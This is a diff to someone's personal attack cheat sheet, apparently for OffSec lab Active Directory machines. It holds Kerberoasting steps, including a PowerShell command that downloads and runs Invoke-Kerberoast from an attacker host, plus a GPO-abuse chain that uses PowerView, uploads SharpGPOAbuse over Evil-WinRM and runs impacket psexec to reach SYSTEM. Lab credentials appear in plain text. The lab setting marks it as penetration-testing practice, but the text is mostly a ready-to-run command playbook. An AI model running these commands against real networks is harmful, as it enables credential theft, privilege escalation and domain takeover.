@@ -17,3 +17,23 @@ ldapsearch -v -x -D fmcsorley@HUTCH.OFFSEC -w CrabSharkJellyfish192 -b "DC=hutch
     2. New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList 'HTTP/CorpWebServer.corp.com'
     3. powershell.exe "IEX (New-Object Net.WebClient).DownloadString('http://192.168.119.140:8000/Invoke-Kerberoast.ps1');Invoke-Kerberoast -erroraction silentlycontinue -OutputFormat John"
     4.copy the hashes and crack it with John
+
+
+Group Policy Object Enumeration
+Powerview.ps1
+	We'll then simply call the PowerView.ps1 script to load it in our PowerShell session.
+	*Evil-WinRM* PS C:\Users\anirudh\Documents> PowerView.ps1
+	1.Get-NetGPO
+ 	2.copy the name label
+	3.Get-GPPermission -Guid 31B2F340-016D-11D2-945F-00C04FB984F9 -TargetType User -TargetName anirudh
+		Trustee     : anirudh
+		TrusteeType : User
+		Permission  : GpoEditDeleteModifySecurity        #we have edit delete modify
+		Inherited   : False
+	4.Download and upload SharpGPOAbuse
+	   wget https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.0_x64/SharpGPOAbuse.exe
+	   *Evil-WinRM* PS C:\Users\anirudh\Documents> upload /home/kali/SharpGPOAbuse.exe
+           *Evil-WinRM* PS C:\Users\anirudh\Documents> gpupdate /force
+           	#If this ran successfully, we will be in local admin group
+        5.Use psexec from impact to get system
+	  python3 /usr/share/doc/python3-impacket/examples/psexec.py vault.offsec/anirudh:SecureHM@192.168.120.116
